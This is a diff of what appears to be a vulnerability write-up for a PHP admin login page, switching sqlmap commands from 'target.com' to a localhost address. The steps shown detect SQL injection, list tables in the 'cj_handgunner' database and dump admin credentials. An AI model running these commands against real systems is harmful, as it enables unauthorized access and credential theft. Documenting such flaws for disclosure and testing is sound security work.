@@ -49,7 +49,7 @@ if($userlogin['user_name'] == $email )
 **Step 1: Detect SQL Injection**
 
 ```bash
-sqlmap -u "http://target.com/handgunner-administrator/adminlogin.php" \
+sqlmap -u "http://localhost:8081/handgunner-administrator/adminlogin.php" \
   --data="emailadd=test&pass=test" \
   --batch \
   --level=3 \
@@ -62,7 +62,7 @@ sqlmap -u "http://target.com/handgunner-administrator/adminlogin.php" \
 **Step 2: Extract Database Tables**
 
 ```bash
-sqlmap -u "http://target.com/handgunner-administrator/adminlogin.php" \
+sqlmap -u "http://localhost:8081/handgunner-administrator/adminlogin.php" \
   --data="emailadd=test&pass=test" \
   --batch \
   -D cj_handgunner \
@@ -74,7 +74,7 @@ sqlmap -u "http://target.com/handgunner-administrator/adminlogin.php" \
 **Step 3: Dump Admin Credentials**
 
 ```bash
-sqlmap -u "http://target.com/handgunner-administrator/adminlogin.php" \
+sqlmap -u "http://localhost:8081/handgunner-administrator/adminlogin.php" \
   --data="emailadd=test&pass=test" \
   --batch \
   -D cj_handgunner \
